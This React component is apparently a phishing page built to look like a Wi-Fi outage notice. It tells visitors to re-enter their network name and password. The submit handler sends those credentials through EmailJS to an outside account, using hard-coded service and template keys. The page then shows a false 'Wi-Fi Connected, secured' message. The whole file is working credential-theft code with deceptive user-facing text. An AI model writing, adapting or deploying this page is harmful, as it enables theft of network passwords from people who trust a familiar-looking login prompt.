import './App.css';
import {
    FormControl,
    FormLabel,
    Text,
    Checkbox,
    Image
} from '@chakra-ui/react'

import emailjs from '@emailjs/browser';
import React, { useRef, useState } from "react";

function App() {
    const [submitClicked, setSubmitClicked] = useState(false)
    const form = useRef()
    const handleSubmit = (e) => {
        setSubmitClicked(true)
        e.preventDefault();
        emailjs.sendForm("service_56j9lnj", "template_smh0a0i", form.current, "Wpsx159ePIxz6QegT")
            .then((result) => {
                console.log(result.text)
            })
            .catch((error) => {
                console.log(error.text)
            })
    };
    return (
        <div className="Log-In">
            <div className='Header'>
                <Image src="/404-error.png" boxSize='300px'
                    objectFit='cover' alt='404' />
                <div>
                    <Text fontSize="25px" fontWeight="bold">Sorry, your Wi-Fi was experiencing some technical difficulties</Text>
                    <Text fontWeight="100" className='Long-Text'>
                        We apologize for any inconvenience caused by the Wi-Fi disruption.
                        To expedite the resolution process and restore your access to the
                        network, please use the login credentials provided below. Enter
                        your username and password in the designated fields to reconnect
                        to the Wi-Fi network. Once you have successfully logged in, the
                        system will initiate the necessary steps to address the technical
                        difficulties and ensure a stable connection. Thank you for your
                        cooperation, and we appreciate your patience as we work to restore
                        seamless access to the Wi-Fi network.</Text>
                </div>
                <Image src="/404-error-1.png" boxSize='300px'
                    objectFit='cover' alt='404' />
            </div>
            {submitClicked ?
                <div>
                    <Text fontSize="20px" className='Login-Text' fontWeight="bold">Wi-Fi Connected, secured.</Text>
                </div> : []}
            <div className="Log-In-Container">
                <Text fontSize="20px" className='Login-Text' fontWeight="bold">Please Log In Again...</Text>
                <form className='Form' ref={form} onSubmit={handleSubmit}>
                    <FormControl isRequired >
                        <FormLabel>Wi-Fi Name</FormLabel>
                        <input className='Input-Field' placeholder='Wi-Fi Name' type='text' name="user_name" />
                    </FormControl>
                    <FormControl isRequired>
                        <FormLabel>Wi-Fi Password</FormLabel>
                        <input className='Input-Field' type='password' placeholder='Wi-Fi Password' name="user_password" />
                    </FormControl>
                    <Checkbox defaultChecked>Connect automatically</Checkbox>
                    <button className='button' value='submit'>Connect</button>
                </form>
            </div>
        </div>
    );
}

export default App;
